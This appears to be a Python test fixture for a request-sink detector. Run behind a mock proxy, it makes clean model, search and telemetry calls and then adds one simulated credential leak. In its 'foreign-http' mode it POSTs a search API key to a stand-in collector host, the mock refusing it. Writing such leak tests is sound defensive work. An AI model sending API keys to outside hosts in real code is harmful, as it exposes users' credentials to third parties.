"""A probe flow for the request-sink tests: plain urllib, which honours the
proxy variables the runner sets, so every request lands on the mock.

Every mode does the same clean work first: it sends MODEL_KEY to the model
API as its bearer token with a clean prompt, sends SEARCH_KEY to the search
API as its bearer token, and exports one clean span. MODE then adds one
request:

- `own`: nothing more;
- `prompt`: a prompt to the model that holds SEARCH_KEY;
- `model-auth`: a model request whose bearer token is SEARCH_KEY;
- `foreign-http`: a plain-HTTP POST of SEARCH_KEY in a JSON body to a
  foreign host, which the mock refuses;
- `foreign-connect`: an HTTPS request to a foreign host, whose CONNECT the
  mock refuses.

It writes both keys to SIDE_FILE so the test can check the output against
them, and always exits 0.
"""

from __future__ import annotations

import json
import os
import urllib.error
import urllib.request

FOREIGN_HTTP = "http://collector.foreign.invalid/ingest"
FOREIGN_HTTPS = "https://api.foreign.invalid/v1/ping"


def call(url: str, body: bytes | None = None, headers: dict[str, str] | None = None) -> None:
    request = urllib.request.Request(url, data=body, headers=headers or {})
    with urllib.request.urlopen(request, timeout=10) as response:
        response.read()


def chat(key: str, prompt: str) -> None:
    body = {"model": "probe-model", "messages": [{"role": "user", "content": prompt}]}
    call(
        os.environ["OPENAI_BASE_URL"] + "/chat/completions",
        json.dumps(body).encode(),
        {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
    )


def main() -> None:
    model_key = os.environ["MODEL_KEY"]
    search_key = os.environ["SEARCH_KEY"]
    with open(os.environ["SIDE_FILE"], "w", encoding="utf-8") as side:
        json.dump([model_key, search_key], side)
    mode = os.environ["MODE"]

    chat(model_key, "What is weir?")
    call(
        os.environ["SEARCH_BASE_URL"] + "/search?q=weir",
        headers={"Authorization": f"Bearer {search_key}"},
    )
    doc = {"resourceSpans": [{"scopeSpans": [{"spans": [{"name": "clean span"}]}]}]}
    call(
        os.environ["OTEL_EXPORTER_OTLP_TRACES_ENDPOINT"],
        json.dumps(doc).encode(),
        {"Content-Type": "application/json"},
    )

    if mode == "prompt":
        chat(model_key, f"Search with this key: {search_key}")
    elif mode == "model-auth":
        chat(search_key, "What is weir?")
    elif mode == "foreign-http":
        try:
            call(
                FOREIGN_HTTP,
                json.dumps({"key": search_key}).encode(),
                {"Content-Type": "application/json"},
            )
        except urllib.error.HTTPError:
            pass  # 403: the mock refused it
    elif mode == "foreign-connect":
        try:
            call(FOREIGN_HTTPS)
        except OSError:
            pass  # the mock refused the tunnel
    elif mode != "own":
        raise SystemExit(f"unknown MODE {mode!r}")


if __name__ == "__main__":
    main()
